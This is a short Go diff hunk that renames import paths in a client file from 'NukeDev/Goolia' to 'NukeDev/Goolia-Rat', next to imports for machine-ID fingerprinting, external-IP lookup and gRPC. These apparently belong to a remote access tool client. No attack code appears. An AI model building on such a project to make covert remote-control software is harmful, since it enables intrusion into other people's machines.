@@ -8,8 +8,8 @@ import (
 	"runtime"
 	"time"
 
-	"github.com/NukeDev/Goolia/client/utils"
-	pb "github.com/NukeDev/Goolia/proto"
+	"github.com/NukeDev/Goolia-Rat/client/utils"
+	pb "github.com/NukeDev/Goolia-Rat/proto"
 	"github.com/denisbrodbeck/machineid"
 	externalip "github.com/glendc/go-external-ip"
 	"google.golang.org/grpc"
